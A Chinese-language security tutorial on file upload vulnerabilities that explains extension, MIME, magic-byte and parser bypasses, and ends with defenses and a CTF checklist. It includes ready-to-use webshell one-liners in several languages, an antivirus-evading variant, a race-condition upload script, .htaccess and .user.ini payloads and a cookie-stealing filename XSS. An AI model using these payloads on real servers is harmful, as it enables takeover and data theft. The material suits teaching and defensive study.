---

title: 文件上传漏洞详解
tags: \[Web 安全, 文件上传, 漏洞利用, CTF, 绕过技巧]
date: 2024-07-01

---

# 文件上传漏洞详解

文件上传漏洞是 Web 安全中最常见的高危漏洞之一。攻击者通过上传恶意文件（如 WebShell）到服务器，进而获取服务器控制权限。本文系统梳理文件上传漏洞的原理、检测方式、绕过技巧及防御方案。

## 1. 漏洞原理

### 1.1 什么是文件上传漏洞

Web 应用在处理用户上传的文件时，如果没有对文件的**类型、内容、后缀名**进行严格校验，攻击者就可以上传一个包含恶意代码的文件，并通过 URL 访问使其在服务器端执行。

### 1.2 危害

- 上传 WebShell，获取服务器控制权

- 上传钓鱼页面，进行社会工程攻击

- 上传恶意脚本，进行 XSS/CSRF 攻击

- 上传木马病毒，控制访问者主机

- 覆盖关键配置文件，破坏服务运行

### 1.3 利用条件

一个完整的文件上传漏洞利用需要满足以下条件：

| 条件       | 说明                                         |
| ---------- | -------------------------------------------- |
| **能上传** | Web 应用存在文件上传功能，且可以上传恶意文件 |
| **能访问** | 上传后的文件能够通过 URL 直接访问            |
| **能解析** | 服务器能够将上传的文件当作脚本解析执行       |

---

## 2. 客户端检测与绕过

### 2.1 JavaScript 前端校验

最常见的前端检测方式，在文件被发送到服务器之前通过 JS 验证文件扩展名。

```javascript
// 典型的前端校验代码
function checkFile() {
  var file = document.getElementById('upload').files[0];
  var ext = file.name.split('.').pop();
  var allowed = ['jpg', 'png', 'gif', 'bmp'];
  if (!allowed.includes(ext)) {
    alert('不允许的文件类型！');
    return false;
  }
  return true;
}
```

**绕过方法**：

1.  **浏览器 F12 开发者工具** — 删除或修改`onsubmit`事件中的校验函数

2.  **Burp Suite 抓包改包** — 先上传合法后缀（如`.jpg`），抓包后改为`.php`

3.  **禁用 JavaScript** — 部分网站 JS 校验失效后直接放行

4.  **修改前端代码** — 在开发者工具中直接修改允许的后缀名列表

### 2.2 MIME 类型检测

客户端可能通过 HTML5 的`accept`属性限制可选文件类型，或通过 JS 检查文件 MIME。

```html
<!-- 这种限制仅影响文件选择器，对安全无效 -->
<input type="file" accept="image/jpeg,image/png" />
```

**绕过**：直接抓包修改 `Content-Type` 请求头即可，服务器端如果不验证则完全无效。

---

## 3. 服务端检测与绕过

### 3.1 后缀名黑名单检测

服务器维护一个危险后缀名黑名单，拦截常见的脚本后缀（`.php`, `.asp`, `.jsp` 等）。

#### 绕过技巧

**大小写混淆**：

    shell.Php → Bypass
    shell.pHP → Bypass
    shell.PhP → Bypass

**双写绕过**（利用只删除一次黑名单后缀的逻辑缺陷）：

    shell.pphphp → 删除中间的php → shell.php → Bypass

**末尾加点/空格绕过**（Windows 特性）：

    shell.php.  → Windows自动去除末尾的点
    shell.php_  → 同上
    shell.php::$DATA → Windows NTFS流绕过

**特殊后缀替代**（取决于服务器配置）：

| 后缀     | 说明                      |
| -------- | ------------------------- |
| `.phtml` | 可作为 PHP 解析（Apache） |
| `.pht`   | 可作为 PHP 解析           |
| `.php3`  | 旧版 PHP 后缀             |
| `.php4`  | 旧版 PHP 后缀             |
| `.php5`  | 旧版 PHP 后缀             |
| `.phar`  | PHP 归档文件              |
| `.shtml` | SSI 包含                  |
| `.asa`   | ASP 可解析                |
| `.cer`   | ASP 可解析                |
| `.cdx`   | ASP 可解析                |
| `.jspx`  | JSP 变体                  |
| `.jspf`  | JSP 片段                  |

**解析后缀绕过**（不常见但可能存在的后缀）：

    shell.php.jpg
    shell.jpg.php
    shell.php;.jpg
    shell.php%00.jpg

---

### 3.2 后缀名白名单检测

服务器只允许指定后缀（如`.jpg`, `.png`, `.gif`），比黑名单更难绕过。

#### 绕过技巧

**%00 截断绕过**（PHP < 5.3.4，magic_quotes_gpc \= off）：

    shell.php%00.jpg → 截断后 → shell.php

在 Burp Suite 中需要手动编辑 Hex，将对应的位置替换为`00`。

**0x0a/0x0d 截断**：

    shell.php → shell.php%0A.jpg → shell.php

**Apache 解析漏洞**：

Apache 从右向左匹配后缀，遇到不认识的后缀继续向左匹配：

    shell.php.xxx → Apache不认识.xxx → 解析为.php

配合上传，可以上传 `shell.php.xxx`（xxx \= 任意不在白名单也不在 Apache 已知列表中的后缀）。

**IIS 解析漏洞**（IIS 6.0）：

IIS 6.0 存在两种解析漏洞：

1.  `shell.asp;.jpg` → 分号后的内容被忽略 → 解析为`.asp`

2.  `shell.asp/任意文件` → 文件夹形式 → 目录下的所有文件都被当作`.asp`解析

---

### 3.3 Content-Type 检测

服务器校验 HTTP 请求中的`Content-Type`是否在允许范围内（如`image/jpeg`）。

**绕过**：Burp Suite 抓包，将`Content-Type`改为`image/jpeg`、`image/gif`、`image/png`等合法值即可。

常见合法 MIME 类型：

    image/gif
    image/jpeg
    image/png
    image/bmp
    text/plain

---

### 3.4 文件内容检测

#### 文件头 Magic Bytes 检测

服务器读取文件开头的几个字节（魔数）来判断文件真实类型。

| 文件类型 | 十六进制魔数                 |
| -------- | ---------------------------- |
| JPG/JPEG | `FF D8 FF E0`                |
| PNG      | `89 50 4E 47 0D 0A 1A 0A`    |
| GIF      | `47 49 46 38 39 61` (GIF89a) |
| BMP      | `42 4D`                      |

**绕过**：在 WebShell 代码前添加合法文件头。

```php
GIF89a<?php phpinfo(); ?>
```

或直接用 16 进制编辑器在文件头部插入 `GIF89a`。

#### getimagesize()检测

PHP 的`getimagesize()`函数会读取图片的尺寸信息，如果文件不是有效图片则返回 false。

**绕过**：在 WebShell 代码前拼合一张真实的小尺寸图片，使`getimagesize()`能正常读取宽高信息。

```bash
# Windows下使用copy命令制作图片马
copy /b 1.jpg + shell.php shell.jpg
```

图片中插入的一句话木马：

```php
<?php fwrite(fopen('shell.php','w'),'<?php @eval($_POST["cmd"]);?>');?>
```

#### 二次渲染

部分应用会对上传的图片做缩放、裁剪等处理（二次渲染），可能会清除嵌入的 PHP 代码。

**绕过思路**：找到渲染后不会被修改的图片区域，将一句话木马写入该区域。例如 GIF 图片中不太容易被修改的数据块。

---

### 3.5 条件竞争绕过

**场景**：服务器先保存文件，再校验。如果校验失败就删除。

**攻击原理**：在上传与校验之间的极小时间窗口内，通过并发请求访问上传的临时文件，在文件被删除前执行 WebShell。

```python
import threading
import requests

def upload():
    """持续上传WebShell"""
    while True:
        files = {'file': open('shell.php', 'rb')}
        requests.post('http://target/upload', files=files)

def access():
    """持续尝试访问上传的文件"""
    while True:
        r = requests.get('http://target/upload/shell.php')
        if r.status_code == 200:
            print('[+] Success!')

# 同时并发
threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

---

## 4. 特殊绕过技巧

### 4.1 .htaccess 文件上传

如果 Apache 允许上传`.htaccess`文件（且`AllowOverride All`），可以通过上传`.htaccess`将任意后缀的文件当作 PHP 解析。

```apache
# 方法一：将.jpg后缀当作PHP解析
AddType application/x-httpd-php .jpg

# 方法二：将指定文件当作PHP解析
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

先上传`.htaccess`，再上传一句话图片马 `shell.jpg`。

```php
GIF89a
<?php @eval($_POST['pass']); ?>
```

### 4.2 .user.ini 绕过

**条件**：PHP 以 CGI/FastCGI 模式运行、服务器允许`.user.ini`文件

利用`.user.ini`的`auto_prepend_file`或`auto_append_file`配置：

```ini
auto_prepend_file=shell.jpg
```

上传`.user.ini`后，所有 PHP 文件在执行前会自动包含`shell.jpg`中的代码。

### 4.3 Nginx 解析漏洞

**条件**：Nginx + PHP，`cgi.fix_pathinfo=1`

    http://target/upload/shell.jpg/1.php

Nginx 将请求交给 PHP-FPM 处理，PHP 发现`.jpg/1.php`中的`1.php`可执行，但文件不存在，于是向上回溯找到`shell.jpg`并将其当作 PHP 解析。

### 4.4 文件名 XSS

即使无法上传 WebShell，也可以在上传文件名中注入 XSS 代码：

```html
<img src="x" onerror="alert(1)" />.jpg "><img
  src="x"
  onerror="alert(document.cookie)"
/>.jpg
```

如果服务端的文件列表页面对文件名输出未做转义，即可触发 XSS。

---

## 5. 一句话木马汇总

### PHP

```php
// POST方式
<?php @eval($_POST['pass']); ?>
<?=@eval($_POST['pass']);?>
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[1])?>');?>

// GET方式
<?php @eval($_GET['pass']); ?>

// 免杀变形
<?php
$k = "ass"."ert";
$k($_POST['pass']);
?>

// 无字母WebShell
<?=$_=[];$_.=[];$_=$_[0]==$_[0];$__=$_;++$__;++$__;++$__;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
++$__;++$__;++$__;++$__;++$__;++$__;$_=$_.$__;->...
```

### ASP

```asp
<%eval(request("pass"))%>
```

### ASPX

```aspx
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
```

### JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## 6. 编辑器上传漏洞

一些在线编辑器（如 FCKeditor、eWebEditor、UEditor）历史上存在文件上传漏洞。

| 编辑器     | 漏洞                                         |
| ---------- | -------------------------------------------- |
| FCKeditor  | 双文件上传绕过、空格/点绕过、`.asp;.jpg`解析 |
| eWebEditor | 默认密码登录后台上传                         |
| UEditor    | SSRF + 文件上传                              |
| KindEditor | 新版本路径遍历上传                           |

利用时注意检查网站是否使用了这些编辑器，并搜索对应的历史漏洞。

---

## 7. 防御方案

### 7.1 文件扩展名

- **白名单制度**：只允许指定后缀上传，禁止使用黑名单

- 统一转为小写后匹配

- 禁止用户自定义文件后缀

### 7.2 文件内容

- 校验文件头 Magic Bytes

- 使用`getimagesize()`检查图片合法性

- 对图片做二次渲染（压缩/裁剪），清除可能内嵌的恶意代码

### 7.3 存储与访问

- 上传目录不直接暴露 URL（通过下载脚本中转，如`download.php?id=123`）

- 存储目录设置脚本执行权限为**无**（`chmod -x uploads/`）

- 文件重命名：用随机字符串（如 UUID）作为存储文件名，丢弃原始文件名

- 使用独立文件服务器/对象存储（OSS/S3），与 Web 服务器分离

### 7.4 服务端配置

```apache
# Apache: 禁止上传目录执行PHP
<Directory "/var/www/html/uploads">
    php_admin_flag engine off
</Directory>
```

```nginx
# Nginx: 禁止上传目录执行PHP
location ~* /uploads/.*\.php$ {
    deny all;
}
```

### 7.5 综合建议

- 上传校验逻辑放在**服务端**，前端校验仅作为用户体验，不可依赖

- 限制单个用户的上传频率和文件大小

- 记录上传日志，配置异常上传告警

- 定期代码审计上传接口

- 使用 WAF（Web 应用防火墙）作为额外防护层

---

## 8. CTF 实战流程

遇到 CTF 文件上传题目的常规思路：

    1. 尝试直接上传PHP → 看返回的错误信息
    2. 上传jpg → 看能否访问，确定上传路径
    3. 改Content-Type为image/jpeg + 文件头GIF89a → 绕过内容和类型校验
    4. 测试各个可解析后缀（phtml, php3, php5, phar...）
    5. 测试大小写、双写、空格、点绕过
    6. 测试%00截断
    7. 测试.htaccess + 图片马组合
    8. 测试.user.ini包含
    9. 测试条件竞争

记住：**能上传 → 能访问 → 能解析**，三者缺一就无法完成利用。遇到卡住的时候，回头检查哪个环节断了。

---
